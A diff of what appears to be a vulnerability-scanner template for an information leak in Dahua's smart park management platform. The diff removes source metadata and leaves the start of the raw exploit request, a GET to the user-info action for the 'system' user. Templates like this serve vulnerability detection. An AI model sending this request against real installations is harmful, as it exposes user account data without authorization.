@@ -3,12 +3,8 @@ info:
   name: 大华智慧园区综合管理平台敏感信息泄露
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mlp34wbgbser13ty'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mlp34wbgbser13ty
-    fofa: 暂无
 http:
 - raw:
   - 'GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
